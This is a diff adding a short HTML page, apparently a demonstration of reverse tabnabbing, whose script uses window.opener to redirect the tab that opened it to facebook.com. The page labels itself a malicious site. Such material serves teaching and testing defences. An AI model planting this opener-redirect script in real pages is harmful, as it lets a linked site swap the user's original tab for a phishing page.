@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>I am malicious Site</h1>
+    <h2>I have modified the contents of the page you came from</h2>
+  </body>
+  <script>
+    if (window.opener) {
+      window.opener.location = 'https://www.facebook.com';
+    }
+  </script>
+</html>
